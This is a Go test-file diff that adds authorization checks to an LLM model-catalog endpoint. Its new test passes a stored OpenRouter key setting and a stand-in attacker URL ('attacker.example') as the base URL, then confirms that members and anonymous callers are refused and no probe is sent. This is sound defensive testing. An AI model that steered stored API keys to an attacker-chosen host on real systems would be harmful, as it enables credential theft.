@@ -14,6 +14,7 @@ import (
 	"testing"
 
 	"github.com/chetto1983/aura/internal/db/sqlc"
+	"github.com/chetto1983/aura/internal/identity"
 	"github.com/chetto1983/aura/internal/llm"
 )
 
@@ -28,7 +29,13 @@ func catalogServerWith(
 ) (*Server, *[]catalogCall) {
 	t.Helper()
 	calls := &[]catalogCall{}
-	s := &Server{settings: &fakeSettingsStore{rows: rows}}
+	s := &Server{
+		settings: &fakeSettingsStore{rows: rows},
+		idAdmin: &fakeIdentityAdmin{caps: map[string][]string{
+			catalogAdmin:  {identity.CapIdentityCreate, identity.CapGovernanceWrite},
+			catalogMember: identity.UserSet(),
+		}},
+	}
 	s.modelCatalog = func(_ context.Context, provider, baseURL, apiKey string) ([]llm.ModelCatalogEntry, error) {
 		*calls = append(*calls, catalogCall{provider: provider, baseURL: baseURL, apiKey: apiKey})
 		return entries, err
@@ -36,11 +43,51 @@ func catalogServerWith(
 	return s, calls
 }
 
+const (
+	catalogAdmin  = "catalog-admin"
+	catalogMember = "catalog-member"
+)
+
 func getModels(t *testing.T, s *Server, query string) *httptest.ResponseRecorder {
 	t.Helper()
+	return getModelsAs(t, s, catalogAdmin, query)
+}
+
+func getModelsAs(t *testing.T, s *Server, actor, query string) *httptest.ResponseRecorder {
+	t.Helper()
+	r := httptest.NewRequest(http.MethodGet, "/api/settings/llm-models?"+query, nil)
+	if actor != "" {
+		r = withPrincipal(r, actor)
+	}
 	rr := httptest.NewRecorder()
-	s.handleListLLMModels(rr, httptest.NewRequest(http.MethodGet, "/api/settings/llm-models?"+query, nil))
+	s.handleListLLMModels(rr, r)
 	return rr
+}
+
+// The probe sends the OpenRouter key to a host the browser names. Every identity holds
+// governance.write, so a member reaching it could read the key off their own server: the
+// gate is identity.create, the same one AURA_LLM_BASE_URL takes.
+func TestHandleListLLMModelsRefusesNonAdmins(t *testing.T) {
+	for _, tc := range []struct {
+		name  string
+		actor string
+		want  int
+	}{
+		{"member with governance.write", catalogMember, http.StatusForbidden},
+		{"no principal", "", http.StatusUnauthorized},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			s, calls := catalogServerWith(t, nil, nil,
+				[]sqlc.AuraSettings{{Key: "OPENROUTER_API_KEY", Value: "sk-or-stored", IsSecret: true}})
+			rr := getModelsAs(t, s, tc.actor, "provider=openrouter&base_url="+url.QueryEscape("https://attacker.example/v1"))
+			if rr.Code != tc.want {
+				t.Fatalf("status = %d (%s), want %d", rr.Code, rr.Body.String(), tc.want)
+			}
+			if len(*calls) != 0 {
+				t.Fatalf("a refused caller still probed: %+v", *calls)
+			}
+		})
+	}
 }
 
 func TestHandleListLLMModelsServesEveryProvider(t *testing.T) {
